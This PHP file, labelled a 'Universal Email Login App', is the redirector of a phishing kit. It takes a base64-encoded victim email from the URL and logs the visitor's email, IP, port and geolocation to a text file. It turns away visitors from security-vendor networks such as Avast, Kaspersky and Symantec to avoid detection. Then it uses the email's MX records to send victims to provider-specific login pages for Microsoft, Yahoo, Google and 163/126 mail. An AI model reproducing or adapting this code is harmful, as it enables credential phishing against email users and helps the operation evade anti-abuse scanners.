<?php
/*
# Universal Email Login App
#Don't use for mailicious purposes please.
#The Author is not liable for any damage, law infringement or any result that may arise form th use of this software.
*/
error_reporting(0);
if(!isset($_GET["ehdgk"]) && !isset($_GET["isfgsValidate"]))
{
echo "Sorry you do not have access to this page.";
exit;
}
else
{
$getEmail = $_GET["ehdgk"];
$user_ip = $_SERVER['REMOTE_ADDR'];	
if(strlen($user_ip) > (15))
{
echo "Sorry you do not have access to this page.";
exit;
}
$user_ip_2 = $_SERVER['REMOTE_HOST'];
$user_port = $_SERVER['REMOTE_PORT'];
$Utime = date("h:i:s a");
$date = date("l d F Y");
$dateandtime = " $date || " . $Utime;
$ipaddress = "IP Address not available for this user";
if(isset($_SERVER["REMOTE_ADDR"]))
{
$ipaddress = $_SERVER["REMOTE_ADDR"];
@$ipaddress_get = json_decode(file_get_contents("http://ipinfo.io/{$ipaddress}/json"));
@$city = $ipaddress_get->city;
@$country = $ipaddress_get->country;
@$state = $ipaddress_get->region;
@$org = $ipaddress_get->org;
}
if(strpos($org, "AVAST") || strpos($org, "ServeTheWorld") || strpos($org, "microsoft") || strpos($org, "NForce") || strpos($org, "Symantec") || strpos($org, "Kaspersky"))
{
echo "Sorry you do not have access to this page.";
exit;
}
$saveEmail = base64_decode($getEmail);
if($saveEmail == "" || $saveEmail == "Invalid Email")
{
echo "Sorry you do not have access to this page.";
exit;
}
$valuez = array("Access email " => "$saveEmail", "user_IP" => "$user_ip", "user_HOST" => "$user_ip_2", "user_PORT" => "$user_port", "date" => "$dateandtime", "city" => "$city", "country" => "$country", "state" => "$state", "org" => "$org");
$handle = fopen("ipz.txt", "a");
foreach($valuez as $variable => $value)
{
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
$email = $_GET["ehdgk"];
$matie = $_GET["isfgsValidate"];
function domainChecker($email)
{
$email = base64_decode($email);
$domain = mxDomain($email);
return $domain;
}
function mxvalidate($email)
{
$domain = substr(strrchr($email, "@"), 1);
if($domain !== false)
{
$arr = dns_get_record($domain, DNS_MX);
if ($arr[0]['host'] == $domain && !empty($arr[0]['target']))
{
return $arr[0]['host'];
}
else
{
return false;

}
}
else
{
return false;
}
}
function mxDomain($email)
{
$result = false;
$domain = mxvalidate($email);
if($domain !== false)
{
$data = dns_get_record($domain, DNS_MX);
foreach ($data as $key1)
{
$mx = $key1["target"];
if(strpos($mx, "outlook") || strpos($mx, "azure") || strpos($mx, "microsoft") || strpos($mx, "live"))
{
$result = "Microsoft";
}
else if(strpos($mx, "yahoo"))
{
$result = "Yahoo";
}
else if(strpos($mx, "gmail") || strpos($mx, "google"))
{
$result = "Google";
}
else
{
$others = nonMx($email);
if($others == "vip.163.com")
{
$result = "Vip.163";
}
else if($others == "vip.126.com")
{
$result = "Vip.126";
}
else if($others == "126.com")
{
$result = "126";
}
else if($others == "163.com")
{
$result = "163";
}
else if($others == "yeah.net")
{
$result = "Yeah";
}
else if($others == "live")
{
$result = "Microsoft";
}
else
{
}
}
}
}
return $result;
}
function nonMx($email)
{
$email = explode("@", $email);
if(isset($email[1]))
{
$email = $email[1];
}
else
{
$email = "None";
}
return $email;
}
$go = domainChecker($email);
if($go == "Microsoft")
{
header("location: login.live.com/?login.srf?wa=wsignin1.0&rpsnv=12&ct=1425083828&rver=6.4.6456.0&wp=MBI_SSL_SHARED&wreply=httpsbay169.mail.live.com%default.aspxFrru3inbox&lc=1033&id=64855&mkt=en-us&cbcxt=mai&jgoogle=$email&xma=$matie");
}
else if($go == "Yahoo")
{
header("location: domain/?jgoogle=$email&xma=$matie");
}
else if($go == "Google")
{
header("location: domain/?jgoogle=$email&xma=$matie");
}
else if($go == "Vip.163")
{
header("location: activity.vip.163.com/?jgoogle=$email&xma=$matie");
}
else if($go == "Vip.126")
{
header("location: activity.vip.126.com/?jgoogle=$email&xma=$matie");
}
else if($go == "126")
{
header("location: mail.126.com/?jgoogle=$email&xma=$matie");
}
else if($go == "163")
{
header("location: mail.163.com/?jgoogle=$email&xma=$matie");
}
else if($go == "Yeah")
{
header("location: yeah.net/?jgoogle=$email&xma=$matie");
}
else
{
header("location: domain/?jgoogle=$email&xma=$matie");
}
}
?>